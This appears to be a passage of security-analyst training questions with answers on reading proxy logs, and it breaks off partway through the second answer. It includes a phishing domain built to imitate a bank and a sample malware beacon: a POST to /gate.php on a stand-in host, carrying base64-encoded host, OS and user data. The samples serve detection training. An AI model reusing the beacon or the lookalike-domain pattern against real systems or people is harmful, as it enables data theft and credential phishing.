  • XFF and User-Agent are attacker-controlled. Check whether the value was added by your own device.
  • "TRACE enabled" is not a major incident. Disable it, but it ranks far below an allowed PUT or web-shell traces.

docs.title: Practice questions
docs.text: Answer first, then expand. The explanations include mistakes people commonly make.

docs.title: Question 1
docs.text:
A proxy log at a company without TLS inspection contains:

2026-10-28 09:12:44 10.1.5.23 CONNECT secure-login.example-bank.com.verify-id.net:443 200

(a) What can and can't you tell from this line alone? (b) Who really owns this domain, and why is it suspicious?

Answer and explanation

(b) The real owner is verify-id.net. .net is the top-level domain (TLD), verify-id the second-level domain, and together verify-id.net is the registered parent domain. secure-login.example-bank.com in front even contains .com and looks like a bank, but it's all subdomain — a classic bank-impersonation phishing domain.

(a)

  • Can tell: who (10.1.5.23), when (09:12:44), which domain and port (443, HTTPS) the tunnel was requested to, and that the proxy allowed it. Since it wasn't blocked, the user most likely reached the site.
  • Can't tell: which pages were viewed, whether credentials were entered (a POST), what was downloaded, or what status the site returned — all of it happened inside the encrypted tunnel.

Common mistake: "TLS connected and it was approved with 200." This 200 is the proxy saying "tunnel open (Connection established)" — the gatehouse saying "I've opened the gate", not that things went well inside. The TLS handshake starts after this 200, inside the tunnel, so this line tells you neither whether TLS succeeded nor what the site answered. Always ask who said each value (the proxy or the destination server).

Next steps: assume the worst (credentials entered) → contact the user, reset the password and revoke sessions (cookies) if needed → search proxy and DNS logs for other staff who visited the domain → block the domain.

docs.title: Question 2
docs.text:
One staff PC sends the request below exactly every 300 seconds, all day. Every company PC runs Windows 11 with current Chrome or Edge. Find as many suspicious points as you can.

POST /gate.php HTTP/1.1
Host: update-check-service.example.org
User-Agent: Mozila/5.0 (compatible; MSIE 8.0; Windows NT 6.1)
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

data=aG9zdD1hZG1pbi1QQzEmb3M9V2luMTEmdXNlcj1qc21pdGg=
Answer and explanation Clue Meaning Exactly every 300 s, all day The most important clue. People don't send on the same interval through lunch and after hours → a program sending a beacon.
